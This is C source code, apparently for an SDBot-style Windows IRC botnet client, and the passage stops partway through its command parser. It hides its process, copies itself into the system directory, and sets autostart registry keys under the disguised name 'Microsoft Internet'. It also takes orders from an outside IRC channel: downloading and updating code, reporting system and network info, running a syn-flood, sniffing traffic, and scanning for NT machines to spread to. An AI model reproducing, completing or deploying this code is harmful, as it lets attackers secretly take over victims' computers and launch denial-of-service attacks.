 #include <winsock2.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <windows.h>

 HANDLE threads[256];     // thread handles
 char threadd[256][128];  // thread descriptions


#include "Synflood.cpp"



 #include <wininet.h>
 #include <shellapi.h>
 #include <mmsystem.h>
#include "crc32.h"


 #define WIN32_LEAN_AND_MEAN

// bot version (used in about/status/version reply)


#define MAX_LINES 20


// #define NO_IDENT      // disables ident server
// #define NO_NETINFO    // disables network info function
// #define NO_SYSINFO    // disables system info function
// #define NO_DOWNLOAD   // disables downloading/updating functions
// #define NO_CONNCHECK  // disables check for internet connection

// macro for predefined aliases. (these are just examples, you can change them to whatever you want)
 #define addpredefinedaliases() \

// bot configuration
 const char botid[] = ""; // bot id
 const char password[] = ""; // bot password
 const  int maxlogins = 2; // maximum number of simultaneous logins
char server[] = "irc."; // server
 const  int port = 6667; // server port
 const char serverpass[] = ""; // server password
char channel[] = "#La"; // channel that the bot should join
char chanpass[] = ""; // channel password
 const char server2[] = ""; // backup server (optional)
 const  int port2 = 6667; // backup server port
 const char channel2[] = ""; // backup channel (optional)
 const char chanpass2[] = ""; // backup channel password (optional)
 const BOOL topiccmd = FALSE; // set to TRUE to enable topic commands
 const BOOL rndfilename = FALSE; // use random file name
 const char filename[] = ".exe"; // destination file name
 const BOOL regrun = TRUE; // use the Run registry key for autostart
 const BOOL regrunservices = TRUE; // use the RunServices registry key for autostart
 const char valuename[] = "Microsoft Internet"; // value name for autostart
 const char prefix = '$'; // command prefix (one character max.)
 const char version[] = "mIRC v6"; // bot's VERSION reply
 const  int maxaliases = 16; // maximum number of aliases (must be greater than the number of predefined aliases).
 const char *authost[] = {"lol@bot", "\0"};

// ping/udp structure.
 typedef struct ps {
	char host[128];
	char chan[128];
	int num;
	int size;
	int delay;
	int port;
	SOCKET sock;
	int threadnum;
	BOOL silent;
	BOOL gotinfo;
 } ps;

// irc/spy structure.
 typedef struct ircs {
	char host[128];
	int port;
	char channel[64];
	char chanpass[64];
	char hchan[64];
	char nick[16];
	SOCKET sock;
	int spy;
	int threadnum;
	BOOL gotinfo;
 } ircs;



 #ifndef NO_DOWNLOAD
// download/update structure
 typedef struct ds {
	char url[256];
	char dest[256];
	char chan[128];
	SOCKET sock;
	int run;
	int threadnum;
	int update;
	BOOL silent;
	BOOL notice;
	BOOL gotinfo;
	BOOL encrypted;
	unsigned long expectedcrc;
	unsigned long filelen;
 } ds;
 #endif



// alias structure
 typedef struct as {
	 char name[24];
	 char command[160];
 } as;

 

// wininet.dll function variables
 typedef int (__stdcall *IGCSE)(LPDWORD, char *, DWORD, DWORD);
 IGCSE fInternetGetConnectedStateEx;
 typedef int (__stdcall *IGCS)(LPDWORD, DWORD);
 IGCS fInternetGetConnectedState;





// kernel32.dll function variables
 
 typedef int (__stdcall *RSP)(DWORD, DWORD);
 RSP fRegisterServiceProcess;


// function prototypes (not really neccesary, but this way i can put the functions in any order i want)
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow);
 char * decryptstr(char *str, int strlen);
 void addlog(char *desc);
 int addalias(char *name, char *command);
 int addthread(char *desc);
 DWORD WINAPI irc_connect(LPVOID param);
 #ifndef NO_IDENT
 DWORD WINAPI ident(LPVOID user);
 #endif
 char * rndnick(char *strbuf);
 int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, BYTE spy);
 int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char *master, char *host, int *in_channel, int repeat);

 void irc_send(SOCKET sock, char *msg);
 void irc_sendf(SOCKET sock, char *msg, char *str);
 void irc_sendf2(SOCKET sock, char *msg, char *str, char *str2);
 void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice);
 char * replacestr(char *str, char *oldstr, char *newstr);


 #ifndef NO_DOWNLOAD
 DWORD WINAPI webdownload(LPVOID param);
 #endif

 #ifndef NO_NETINFO
 char * netinfo(char *ninfo, char *host, SOCKET sock);
 #endif
 #ifndef NO_SYSINFO
 char * sysinfo(char *sinfo);
 int cpuspeed(void);
 unsigned __int64 cyclecount();
 #endif

 void uninstall(void);

// global variables
 HANDLE ih;              // internet handle
 ircs mainirc;           // main irc structure
 char prefix1 = prefix;  // prefix variable

 SOCKET csock[64];       // thread sockets
 char cnick[64][16];     // thread nicks
 char log[128][128];     // log entries
 DWORD w;                // DWORD used for various stuff
 as aliases[maxaliases]; // alias array
 int anum = 16;          // number of aliases
 BOOL success = FALSE;   // if true then we made successful connect attempt
 char tempdir[256];      // name of temp folder
 char pbuff[65500];      // packet buffer
 BOOL noicmp;            // if true, icmp.dll is available
 BOOL noigcse;           // if true, InternetGetConnectedStateEx function is available
 DWORD started;          // time bot was started


 int Split(char *inStr, void *saveArray);
 unsigned long ResolveAddress(char *Host);
 char *Xorbuff(char *buff,int buffLen);
 #include "ntpass.cpp"

 // program starts here
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
	WSADATA wsadata;
	int i = 0, err = 0;
	HKEY key;
	char cfilename[256];
	char filename1[64];
	char sysdir[256];
	char tstr[256];
	DWORD cstat;
	int copies = 0;
	BOOL bkpserver = FALSE;
	BOOL noigcs;

	// record start time
	started = GetTickCount() / 1000;




	// load functions from kernel32.dll and hide from the windows 9x task manager
	HINSTANCE kernel32_dll = LoadLibrary("kernel32.dll");
	if (kernel32_dll) {
		fRegisterServiceProcess = (RSP)GetProcAddress(kernel32_dll, "RegisterServiceProcess");

		if (fRegisterServiceProcess) fRegisterServiceProcess(0, 1);
	}

	// initialize wininet stuff
	ih = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (ih == NULL) ih = 0;
	// see if InternetGetConnectedStateEx is available
	HINSTANCE wininet_dll = LoadLibrary("WININET.DLL");
    if (wininet_dll == 0) noigcse = TRUE;
 	else {
		fInternetGetConnectedState = (IGCS)GetProcAddress(wininet_dll, "InternetGetConnectedState");
		if (!fInternetGetConnectedState) {
			noigcs = TRUE;
		} else noigcs = TRUE;

	 	fInternetGetConnectedStateEx = (IGCSE)GetProcAddress(wininet_dll, "InternetGetConnectedStateEx");
 		if (!fInternetGetConnectedStateEx) {
	        noigcse = TRUE;
	    } else noigcse = FALSE;
	}

	// get our file name and the path to the temp folder
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	GetTempPath(sizeof(tempdir), tempdir);

	// check if this exe is running already
	CreateMutex(NULL, FALSE, botid);
	while (GetLastError() == ERROR_ALREADY_EXISTS) {
		Sleep(5000);		//for updates... cheap bugfix.
	}



	err = WSAStartup(MAKEWORD(2, 2), &wsadata);
	if (err != 0) return 0;
	if ( LOBYTE( wsadata.wVersion ) != 2 || HIBYTE( wsadata.wVersion ) != 2 ) {
		WSACleanup();
		return 0;
	}


	srand(GetTickCount());
	if (rndfilename) rndnick((char *)&filename); else strncpy(filename1, filename, sizeof(filename1)-1);

	GetSystemDirectory(sysdir, sizeof(sysdir));
	if (strstr(cfilename, sysdir) == NULL) {
		Sleep(1000);
		// loop until the file is copied.
		sprintf(tstr, "\\%s", filename1);
		while (CopyFile(cfilename, strcat(sysdir, tstr), FALSE) == FALSE) Sleep(2000);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;
		WSACleanup();
		if (CreateProcess(NULL, sysdir, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo)) exit(0);
	}


	if (regrun) {
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
		RegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)&filename1, sizeof(filename)+1);
		RegCloseKey(key);
	}


	if (regrunservices) {
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
		RegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)&filename1, sizeof(filename)+1);
		RegCloseKey(key);
	}

	memset(threadd, 0, sizeof(threadd));
	memset(cnick, 0, sizeof(cnick));
	memset(aliases, 0, sizeof(aliases));

	addthread("main thread");

	// remove the following line if you don't want any predefined aliases
	addpredefinedaliases();

	memset(log, 0, sizeof(log));
	addlog("bot started.");

	// copy settings into main irc structure
	strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
	mainirc.port = port;
	strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
	strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
	mainirc.spy = 0;

	while (1) {
		for (i = 0; i < 6; i++) {
			#ifndef NO_CHECKCONNECTION
			// check if we're connected to the internet... if not, then wait 5mins and try again
			if (!noigcs) if (fInternetGetConnectedState(&cstat, 0) == FALSE) {
				Sleep(30000);
				continue;
			}
			#endif

			err = irc_connect((void *)&mainirc);
			
			success = FALSE;
			if (err == 2) break; // break out of the loop

			if (success) i--; // if we're successful in connecting, decrease i by 1;

			// irc_connect didn't return 2, so we need to sleep then reconnect
			Sleep(3000);
		}

		if (err == 2) break; // break out of the loop and close

		if (bkpserver) {
			strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
			mainirc.port = port;
			strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
			bkpserver = FALSE;
		}
		else if (!bkpserver && server2[0] != '\0') {
		    strncpy(mainirc.host, server2, sizeof(mainirc.host)-1);
			mainirc.port = port2;
			strncpy(mainirc.channel, channel2, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass2, sizeof(mainirc.chanpass)-1);
			bkpserver = TRUE;
		}
	}

	// cleanup;
	for (i = 0; i < 64; i++) closesocket(csock[i]);
	WSACleanup();

	return 0;
 }


// function to add a log item
 void addlog(char *desc)
 {
	SYSTEMTIME st;

	GetLocalTime(&st);

	for (int i = 126; i >= 0; i--) if (log[i][0] != '\0') strncpy(log[i+1], log[i], sizeof(log[i+1])-1);
	sprintf(log[0], "[%d-%d-%d %d:%d:%d] %s", st.wMonth, st.wDay, st.wYear, st.wHour, st.wMinute, st.wSecond, desc);
 }

// function to add an alias and return alias number
 int addalias(char *name, char *command)
 {
	int i;
	for (i = 0; i < maxaliases; i++) {
		if (aliases[i].name[0] == '\0' || strcmp(aliases[i].name, name) == 0) {
			memset(&aliases[i], 0, sizeof(aliases[i]));
			strncpy(aliases[i].name, name, sizeof(aliases[i].name)-1);
			strncpy(aliases[i].command, command, sizeof(aliases[i].command)-1);
			anum++;
			break;
		}
	}
	return i;
 }

// function to add description to thread list and return thread number
 int addthread(char *desc)
 {
	int i;
	for (i = 0; i < 64; i++) {
		if (threadd[i][0] == '\0') {
			strncpy(threadd[i], desc, sizeof(threadd[i])-1);
			break;
		}
	}
	return i;
 }

// connect function used by the original bot and all clones/spies
 DWORD WINAPI irc_connect(LPVOID param)
 {
	SOCKET sock;
	SOCKADDR_IN ssin;
	DWORD err;
	int rval;
	char nick[16];
	char *nick1;
	char str[64];
	BYTE spy;
	ircs irc;

	irc = *((ircs *)param);
	ircs *ircp = (ircs *)param;
	ircp->gotinfo = TRUE;


	while (1) {
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = htons(irc.port);

		ssin.sin_addr.s_addr=ResolveAddress(irc.host);
		if (ssin.sin_addr.s_addr==0) return 0;

		memset(nick, 0, sizeof(nick));
		if (irc.spy == 1) {
			nick1 = irc.nick; 
		} else {
			nick1 = rndnick(nick);
			DWORD uptime;
			uptime=GetTickCount();
			if (uptime > 864000000) {	//If uptime is greater than 10 days, mark them out...
				nick1[0]='D';
				if (uptime > 1296000000) {	//15 days
					nick[0]='C';
					if (uptime > 1728000000) {
						nick[0]='B';		//20 days
						if (uptime > 2592000000) {
							nick[0]='A';	//30 days..
						}
					}
				}
			}
		}

		#ifndef NO_IDENT
		CreateThread(NULL, 0, &ident, NULL, 0, &err);
		#endif

		sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		csock[irc.threadnum] = sock;
		err = connect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		if (err == SOCKET_ERROR) {
			closesocket(sock);
			Sleep(2000);
			continue;
		}

		sprintf(str, "connected to %s.", irc.host);

		addlog(str);

		strncpy(cnick[irc.threadnum], nick1, sizeof(cnick[irc.threadnum])-1);

		if (irc.spy == 1) spy = 1; else spy = 0;
		rval = irc_receiveloop(sock, irc.channel, irc.chanpass, nick1, irc.sock, irc.hchan, irc.host, spy);
		closesocket(sock);

		if (rval == 0) continue;
		if (rval == 1) {	//Disconnect (sleep 30 mins, reconnect..)
			Sleep(1800000);
			continue;
		}
		if (rval == 2) break;	//Quit
	}

	threads[irc.threadnum] = 0;
	threadd[irc.threadnum][0] = '\0';
	cnick[irc.threadnum][0] = '\0';
	return rval;
 }

 #ifndef NO_IDENT
// ident server
 DWORD WINAPI ident(LPVOID param)
 {
	SOCKET isock, csock;
	SOCKADDR_IN issin;
	char user[12];
	char buff[500];

	isock = socket(AF_INET, SOCK_STREAM, 0); // set isock to standard TCP socket
	memset(&issin, 0, sizeof(issin));
	issin.sin_addr.s_addr=INADDR_ANY;
	issin.sin_family = AF_INET; // AF_INET is currently the only supported family
	issin.sin_port = htons(113); // set ident port
	bind(isock, (SOCKADDR *)&issin, sizeof(issin)); // bind issin to isock
	listen(isock,5);
	csock=accept(isock,0,0);
	if (csock==INVALID_SOCKET) return 0;
	closesocket(isock);
	if (recv(csock,buff,sizeof(buff),0)==SOCKET_ERROR) return 0;
	Split(buff,0);
	memset(user, 0, sizeof(user));
	rndnick(user);
	strcat(buff," : USERID : UNIX : ");
	strcat(buff,user);
	strcat(buff,"\r\n");
	send(csock,buff,strlen(buff),0);
	// we're done, so let's close our sockets and return
	closesocket(csock);
	return 0;
 }
 #endif

 char * rndnick(char *strbuf)
 {
	int n, nl;
	char nick[12];
	memset(nick, 0, sizeof(nick));
	nl = (rand()%3)+4;
	for (n=0; n<nl; n++) nick[n] = (rand()%26)+97;
	nick[n+1] = '\0';

	strncpy(strbuf, nick, 12);
	return strbuf;
 }

// receive loop for bots/spies
 int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, BYTE spy)
 {
	// main receive buffer
	char buff[4096];
	int err, repeat;
	char master[128*maxlogins];
	char str[8];
	char login[64];
	int in_channel=0;

	memset(master, 0, sizeof(master));


	if (serverpass[0] != '\0') {
		sprintf(login, "PASS %s\r\n", serverpass);
		send(sock, login, strlen(login), 0);
	}
	sprintf(login, "NICK %s\r\n"
				   "USER %s 0 0 :%s\r\n", nick1, rndnick(str), nick1);
	err = send(sock, login, strlen(login), 0);
	if (err == SOCKET_ERROR) {
		closesocket(sock);
		Sleep(5000);
		return 0;
	}

	// loop forever
	while(1) {
		char host[160];
		char *lines[MAX_LINES];
		int i,j;

		memset(buff, 0, sizeof(buff));
		err = recv(sock, buff, sizeof(buff), 0);
		// if recv() returns 0, that means that the connection has been lost.
		if ((err == 0) || (err == SOCKET_ERROR)) break;

		// split lines up if multiple lines received at once, and parse each line

		
		i=Split(buff,&lines);
		for (j=0;j<i;j++) {
			repeat=1;
			do {
				repeat=irc_parseline(lines[j], sock, channel, chanpass, nick1, server, master, host, &in_channel, repeat);
				repeat--;
			} while (repeat>0);
			if (repeat==-1) return 0;	//Reconnect
			else if (repeat==-2) return 1;	//Disconnect
			else if (repeat==-3) return 2;	//Quit
		}

	}

	return 0;
 }

// function to parse lines for the bot and clones
 int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char *master, char *host, int *in_channel, int repeat)
 {
	char line1[512];
	char line2[512];
	char buff[512];
	char *masters[maxlogins];
	BOOL ismaster;
	char ntmp[12];
	char ntmp2[3];
	int i, ii, s;
	char *a[32];
	char a0[128];
	char nick[16];
	char user[24];
	char sendbuf[512];
	unsigned char parmenters[256];
	char msg_real_dest[256];
	DWORD id;
	BOOL silent = FALSE;
	BOOL notice = FALSE;
	BOOL usevars = FALSE;
	int cl;

	memset(sendbuf, 0, sizeof(sendbuf));

	id = 0;
	strncpy(nick, nick1, sizeof(nick)-1);
	for (i = 0; i < maxlogins; i++) masters[i] = master + (i * 128);

	if (line == NULL) return 1;
	memset(line1, 0, sizeof(line1));
	strncpy(line1, line, sizeof(line1)-1);
	char *x = strstr(line1, " :");

	// split the line up into seperate words
	strncpy(line2, line1, sizeof(line2)-1);
	a[0] = strtok(line2, " ");
	for (i = 1; i < 32; i++) a[i] = strtok(NULL, " ");

	if (a[0] == NULL || a[1] == NULL) return 1;


	silent=TRUE;	//silent by default :)
	//check for 'silent' parameter

	memset(parmenters,0,sizeof(parmenters));

	for (i=31;i>=0;i--) {
		if (!a[i]) continue;
		if ((a[i][0]=='-') && (a[i][2]==0)) {
			//Looks like a valid parmenter..
			parmenters[a[i][1]]=1;
			a[i][0]=0;
			a[i][1]=0;
			a[i][2]=0;
			a[i]=NULL;
		} else break;
	}


	if (parmenters['s']) silent=FALSE;
	if (parmenters['n']) {
		silent=FALSE;
		notice=TRUE;
	}


	if (a[0][0] != '\n') {
		strncpy(a0,  a[0], sizeof(a0)-1);
		strncpy(user, a[0]+1, sizeof(user)-1);
		strtok(user, "!");
	}


	// pong if we get a ping request from the server
	if (strcmp("PING", a[0]) == 0) {
		a[0][1]='O';

		irc_sendf(sock, "PONG %s\r\n", a[1]+1);
		if (*in_channel == 0) {
			irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
		}
		return 1;
	}

	// looks like we're connected to the server, let's join the channel
	if (strcmp("001", a[1]) == 0 || strcmp("005", a[1]) == 0) {
		irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
		irc_sendf(sock, "USERHOST %s\r\n", nick1); // get our hostname
		irc_sendf(sock,"MODE %s +i\r\n",nick1);
		success = TRUE;
		return 1;
	}

	// get host
	if (strcmp("302", a[1]) == 0) {
		char *h = strstr(a[3], "@");
		if (h != NULL) strncpy(host,  h+1, 159);
		return 1;
	}

	// check if user is logged in
	ismaster = FALSE;
	for (i = 0; i < maxlogins; i++) {
		if (strcmp(masters[i], a0) == 0) {
			ismaster = TRUE;
		}
	}

	//rejoin channel if we're kicked, otherwise reset master if it was our master that got kicked
	if (strcmp("KICK", a[1]) == 0) {
		char *knick;
		for (i = 0; i < maxlogins; i++) {
			if (masters[i][0] == '\0') continue;
			strncpy(a0,  masters[i], sizeof(a0)-1);
			knick = user;
			if (knick != NULL && a[3] != NULL) if (strcmp(knick, a[3]) == 0) {
				masters[i][0] = '\0';
				sprintf(sendbuf,"user %s logged out.", knick);
				irc_sendf2(sock, "NOTICE %s :%s\r\n", knick, sendbuf);
				addlog(sendbuf);
			}
		}
		if (strcmp(nick1, a[3]) == 0) {
			*in_channel = 0;
			irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
		}
		return 1;
	}


	if (strcmp("NICK", a[1]) == 0) {
		char *oldnck = user;
		char *newnck = a[2] + 1;
		for (i=0;i<maxlogins;i++) {
			if (strcmp(masters[i],a0)==0) {
				//Master has changed nick
				//Lets TRY to rebuild the master-usermask.
				char *identandhost=strchr(a0,'!');
				if (identandhost) {
					masters[i][0]=':';	//Prefix
					strcpy(&masters[i][1],newnck);
					strcat(&masters[i][2],identandhost);
				}
			}
		}
		if (oldnck != NULL && newnck != NULL)  {
			if (strcmp(oldnck, nick1) == 0) strncpy(nick1,  newnck, 15);
		}
		return 1;
	}


	// reset master if master parts or quits
	if (strcmp("PART", a[1]) == 0 || strcmp("QUIT", a[1]) == 0) for (i = 0; i < maxlogins; i++) if (masters[i][0] != '\0') if (strcmp(masters[i], a[0]) == 0) {
		masters[i][0] = '\0';
		sprintf(sendbuf, "user %s logged out.", user);
		addlog(sendbuf);
		if (strcmp("PART", a[1]) == 0) irc_sendf2(sock, "NOTICE %s :%s\r\n", a[0] + 1, sendbuf);
		return 1;
	}

	// we've successfully joined the channel
	if (strcmp("353", a[1]) == 0) {
		if (strcmp(channel, a[4]) == 0) *in_channel = 1;
		sprintf(sendbuf, "joined channel %s.", a[4]);
		addlog(sendbuf);
		return 1;
	}

	// if we get a privmsg, notice or topic command, start parsing it
	if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0 || (strcmp("332", a[1]) == 0 && topiccmd)) {
		if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {	// it's a privmsg/notice
			if (strcmp("NOTICE", a[1]) == 0) notice = TRUE;
			if (a[2] == NULL) return 1;
			strcpy(msg_real_dest,a[2]);
			if (strstr(a[2], "#") == NULL || notice) a[2] = user;



			if (a[3] == NULL) return 1;
			a[3]++;
			// if our nick is the first part of the privmsg, then we should look at a[4] for a command, a[3] otherwise.
			if (strncmp(nick, a[3], strlen(nick)) == 0) s = 4; else s = 3;
			if (a[s] == NULL) return 1;
			// if someone asks for our version, send version reply
			if (strcmp("\1VERSION\1", a[s]) == 0) if (a[2][0] != '#' && version[0] != '\0') {
				irc_sendf2(sock, "NOTICE %s :\1VERSION %s\1\r\n", a[2], (char *)version);
				return 1;
			}
			else if (strcmp("\1PING", a[s]) == 0) if (a[s+1] != NULL && a[2][0] != '#') {
				irc_sendf2(sock, "NOTICE %s :\1PING %s\1\r\n", a[2], a[s+1]);
				return 1;
			}
		} else  { // it's a topic command
			s = 4;
			a[4]++;
			a[2] = a[3];
		}

		if (a[s]++[0] != prefix1) return 1;
		// see if someone is logging in

		if (strcmp("login", a[s]) == 0) {
if (a[s+1] == NULL) return 1;
if (ismaster || strstr(a[2], "#") == NULL) return 1;
	char *u = strtok(a[0], "!") + 1;
	char *h = strtok(NULL, "\0");
	h = strtok(h, "~");
	if (strcmp(password, a[s+1]) != 0) {
		irc_sendf(sock, "NOTICE %s :pass auth failed.\r\n", user);
		irc_sendf(sock, "NOTICE %s :your attempt has been logged.\r\n", user);
		sprintf(sendbuf, "*failed pass auth by %s(%s).", u, h);
		addlog(sendbuf);
	 return 1; 
	}
	int i=0, host_ok=0;
 	while(authost[i][0])
 	if (!strcmp(h, authost[i++])) host_ok = 1;
 		if (!host_ok) {
 		irc_sendf(sock, "NOTICE %s :host auth failed.\r\n", user);
 		irc_sendf(sock, "NOTICE %s :your attempt has been logged.\r\n", user);
 		sprintf(sendbuf, "*failed host auth by %s(%s).", u, h);
 		addlog(sendbuf);
 	 return 1;
	}
	for (i = 0; i < maxlogins; i++) {
		if (a[s+1] == NULL) return 1;
		if (masters[i][0] != '\0') continue;
		if (strcmp(password, a[s+1]) == 0) {
		strncpy(masters[i],  a0, 127);
		if (!silent) irc_privmsg(sock, a[2], "password accepted.", notice);
		sprintf(sendbuf, "user %s(%s) logged in.", u, h);
		addlog(sendbuf);
		break;
		}
	}
 return 1;
}

		if (ismaster || strcmp("332", a[1]) == 0) {
			// commands requiring no parameters
			// check if the command matches an alias's name
			for (i = 0; i < anum; i++) {
				if (strcmp(aliases[i].name, a[s]) == 0) {
					char *sc = strstr(line, " :");
					if (sc == NULL) return 1;
					sc[2] = prefix1;
					sc[3] = prefix1;
					strncpy(sc+4, aliases[i].command, 159);

					// process '$x-' parameter variables
					for (ii=15; ii > 0; ii--) {
						sprintf(ntmp, "$%d-", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii+1] != NULL) {
							x = x + strlen(aliases[i].name);
							if (x != NULL) {
								char *y = strstr(x, a[s+ii]);
								if (y != NULL) replacestr(line, ntmp, y);
							}
						}
						else if (a[s+ii+1] == NULL) {
							strncpy(ntmp2, ntmp, 2);
							ntmp2[2] = '\0';
							replacestr(line, ntmp, ntmp2);
						}
					}

					// process '$x' parameter variables
					for (ii=16; ii > 0; ii--){
						sprintf(ntmp, "$%d", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii] != NULL) replacestr(line, ntmp, a[s+ii]);
					}

					usevars = TRUE;
					break;
				}
			}

			if (a[s][0] == prefix1 || usevars) {
				// process variables
				replacestr(line, "$me", nick1); // bot's nick
				replacestr(line, "$user", user); // user's nick
				replacestr(line, "$chan", a[2]); // channel name (or user name if this is a privmsg to the bot)
				replacestr(line, "$rndnick", rndnick(ntmp)); // random string of 4-7 characters
				replacestr(line, "$server", server); // name of current server

				// process '$chr()' variables
				while (strstr(line, "$chr(") != NULL) {
					char *c = strstr(line, "$chr(");
					strncpy(ntmp, c+5, 4);
					strtok(ntmp, ")");
					if (ntmp[0] < 48 || ntmp[0] > 57)  strncpy(ntmp, "63", 3);
					if (atoi(ntmp) > 0) ntmp2[0] = atoi(ntmp); else ntmp2[0] = (rand()%96) + 32;
					ntmp2[1] = '\0';
					cl = strlen(ntmp);
					memset(ntmp, 0, sizeof(ntmp));
					strncpy(ntmp, c, cl+6);
					replacestr(line, ntmp, ntmp2);
				}

				// re-split the line into seperate words
				strncpy(line1, line, sizeof(line1)-1);
				strncpy(line2, line1, sizeof(line2)-1);
				a[0] = strtok(line2, " ");
				for (i = 1; i < 32; i++) a[i] = strtok(NULL, " ");
				if (a[s] == NULL) return 1;
				a[s] += 3;
			}

			if (strcmp("rndnick", a[s]) == 0 || strcmp("rn", a[s]) == 0) {
				rndnick(nick);
				irc_sendf(sock, "NICK %s\r\n", nick);
			}
			else if (strcmp("die", a[s]) == 0 || strcmp("d", a[s]) == 0) {
				if (strcmp("332", a[1]) != 0) exit(0);
			}
			else if (strcmp("logout", a[s]) == 0 || strcmp("lo", a[s]) == 0) {
				for (i = 0; i < maxlogins; i++) if (strcmp(masters[i], a[0]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf, "user %s logged out.\r\n", user);
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);
				}
			}
			else if (strcmp("reconnect", a[s]) == 0 || strcmp("r", a[s]) == 0) {
				irc_send(sock, "QUIT :reconnecting");
				return 0;
			}
			else if (strcmp("disconnect", a[s]) == 0 || strcmp("d", a[s]) == 0) {
				irc_send(sock, "QUIT :later");
				return -1;
			}
			else if (strcmp("quit", a[s]) == 0 || strcmp("q", a[s]) == 0) {
				if (a[s+1] == NULL) irc_send(sock, "QUIT :later\r\n"); else {
					if (x != NULL) {
						char *y = strstr(x, a[s+1]);
						if (y != NULL) irc_sendf(sock, "QUIT :%s\r\n", y);
					}
				}
				return -2;
			}
			else if (strcmp("status", a[s]) == 0 || strcmp("s", a[s]) == 0) {
				DWORD total, days, hours, minutes;
				total = (GetTickCount() / 1000) - started;
				days = total / 86400;
				hours = (total % 86400) / 3600;
				minutes = ((total % 86400) % 3600) / 60;
				sprintf(sendbuf, " ready. Up %dd %dh %dm.", days, hours, minutes);
				irc_privmsg(sock, a[2], sendbuf, notice);
			}
			else if (strcmp("id", a[s]) == 0 || strcmp("i", a[s]) == 0) irc_privmsg(sock, a[2], (char *)botid, notice);
			else if (strcmp("threads", a[s]) == 0 || strcmp("t", a[s]) == 0) {
				irc_privmsg(sock, a[2], "-[thread list]-", notice);
				for (i = 0; i < 64; i++) {
					if (threadd[i][0] != '\0') {
						sprintf(sendbuf, "%d. %s", i, threadd[i]);
						irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
			}
			else if (strcmp("aliases", a[s]) == 0 || strcmp("al", a[s]) == 0) {
				irc_privmsg(sock, a[2], "-[alias list]-", notice);
				for (i = 0; i < maxaliases; i++) {
					if (aliases[i].name[0] != '\0') {
						sprintf(sendbuf, "%d. %s = %s", i, aliases[i].name, aliases[i].command);
						irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
			}
			else if (strcmp("l0g", a[s]) == 0 || strcmp("Na", a[s]) == 0) {
				for (i = 0; i < 128; i++) {
					if (log[i][0] != '\0') {
						irc_privmsg(sock, a[2], log[i], notice);
					}
				}
			}

			else if (strcmp("stest_off",a[s])==0) {	//Turn off sniffing...
				bRunSniffer=FALSE;
				if (!silent) irc_privmsg(sock,a[2],"Turned off sniffer",notice);
			}
			#ifndef NO_NETINFO
			else if (strcmp("netinfo", a[s]) == 0 || strcmp("ni", a[s]) == 0) irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
			#endif
			#ifndef NO_SYSINFO
			else if (strcmp("sysinfo", a[s]) == 0 || strcmp("si", a[s]) == 0) irc_privmsg(sock, a[2], sysinfo(sendbuf), notice);
			#endif
			else if (strcmp("remove", a[s]) == 0 || strcmp("rm", a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "removing bot...", notice);
				uninstall();
				WSACleanup();
				exit(0);
			}
			else if (strcmp("ntstop",a[s])==0) {
				if (!silent) irc_privmsg(sock,a[2],"Stopped ntscan.",notice);
				ntscan=FALSE;
			}
			else if (strcmp("ntdel",a[s])==0) {
				DeleteFile("payload.dat");
				if (!silent) irc_privmsg(sock,a[2],"Removed payload.dat",notice);
			}
			// commands requiring at least 1 parameter
			else if (a[s+1] == NULL) return 1;
			else if (strcmp("stest",a[s])==0) {
				//Syn-flood test
				unsigned long testip,ourip;
				SOCKADDR_IN psin;
				int sin_size;
				sin_size=sizeof(SOCKADDR_IN);
				getsockname(sock,(LPSOCKADDR)&psin,&sin_size);
				
				ourip=psin.sin_addr.s_addr;
